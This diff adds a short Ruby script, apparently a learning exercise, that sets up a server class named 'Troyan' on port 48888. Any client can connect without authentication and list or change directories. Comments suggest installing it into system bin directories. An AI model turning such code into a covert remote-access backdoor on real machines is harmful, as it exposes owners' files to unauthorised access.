@@ -1,0 +1,41 @@
+#!/usr/bin/env ruby
+
+## cp socket02 ~/.local/bin
+# sudo cp -t /usr/local/bin socket02
+# sudo cp -t /usr/local/sbin socket02
+
+require 'gserver'
+
+class Troyan < GServer
+  def serve(session)
+    session.print "Welcome to server\r\nYou can enter commands: ls <dir> | cd <dir> | shutdown\r\n"
+    loop do
+      cmd, arg = *session.gets.chomp.split
+      case cmd
+        when "ls"
+          begin
+            session.print Dir[arg || "*"].map{ |str| str + "\r\n" }
+          rescue
+            session.print "No such file or directory - #{ arg.inspect }\r\n"
+          end
+        when "cd"
+          begin
+            Dir.chdir(arg)
+            session.print "OK.\r\n"
+          rescue
+            session.print "No such file or directory - #{ arg.inspect }\r\n"
+          end
+        when "shutdown"
+          session.close
+          break
+        else
+          session.print "Bad command!\r\n"
+      end
+    end
+  end
+end
+
+troyan = Troyan.new(48888)
+troyan.audit = true
+troyan.start
+troyan.join
